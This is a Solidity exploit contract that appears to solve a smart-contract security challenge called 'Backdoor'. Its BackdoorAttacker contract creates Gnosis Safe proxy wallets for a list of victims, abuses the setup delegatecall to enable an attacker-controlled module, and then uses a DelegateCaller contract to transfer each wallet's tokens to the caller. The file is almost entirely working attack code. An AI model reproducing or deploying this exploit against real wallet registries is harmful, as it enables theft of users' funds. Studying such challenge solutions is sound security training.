// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

// 1. Call WalletProxyFactory 4x for every owner
//      - Check why fallback manager is being used and exploit in order to retrieve received tokens
contract BackdoorAttacker {

    IERC20 token;
    address singleton;
    IProxyCreationCallback callback;
    GnosisSafeProxyFactory proxyFactory;
    
    constructor (
        address proxyFactory_,
        address token_,
        address singleton_,
        address callback_
    )
    { 
        token = IERC20(token_);
        singleton = singleton_;
        callback = IProxyCreationCallback(callback_);
        proxyFactory = GnosisSafeProxyFactory(proxyFactory_);
    }

    function attack(address[] calldata victums, address delegateCallAttacker) external {
        bytes memory delegateCalldata = abi.encodeWithSelector(
            ModuleManager.enableModule.selector,
            delegateCallAttacker
        );

        console.log("DelegateCallAttacker: ", delegateCallAttacker);

        address[] memory wallets = new address[](victums.length);

        for (uint256 i; i < victums.length;) {
            address[] memory owners = new address[](1);
            owners[0] = victums[i];

            bytes memory initdata = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                delegateCallAttacker,
                delegateCalldata,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            GnosisSafeProxy wallet = proxyFactory.createProxyWithCallback(
                singleton,
                initdata,
                i,
                callback
            );

            console.log("Created wallet: ", address(wallet));
            console.log("Module enabled: ", ModuleManager(address(wallet)).isModuleEnabled(delegateCallAttacker));
            // (address[] memory modules, ) = ModuleManager(address(wallet)).getModulesPaginated(address(0x1), 10);
            // console.log("Modules: ", modules[0]);

            wallets[i] = address(wallet);

            unchecked {
                ++i;
            }
        }

        DelegateCaller(delegateCallAttacker).pullFunds(
            address(token),
            wallets,
            msg.sender
        );
    }
}

contract DelegateCaller { 
    address internal constant SENTINEL_MODULES = address(0x1);

    address dummy;
    mapping(address => address) internal modules;

    function enableModule(address module) external {
        // Module address cannot be null or sentinel.
        require(module != address(0) && module != SENTINEL_MODULES, "GS101");
        // Module cannot be added twice.
        require(modules[module] == address(0), "GS102");
        modules[module] = modules[SENTINEL_MODULES];
        modules[SENTINEL_MODULES] = module;
    }


    function pullFunds(address token, address[] memory wallets, address receiver) external {
        for (uint i; i < wallets.length; i++) {
            ModuleManager(wallets[i]).execTransactionFromModule(
                token,
                0,
                abi.encodeWithSelector(IERC20.transfer.selector, receiver, 10 ether),
                Enum.Operation.Call
            );
        }
    }
}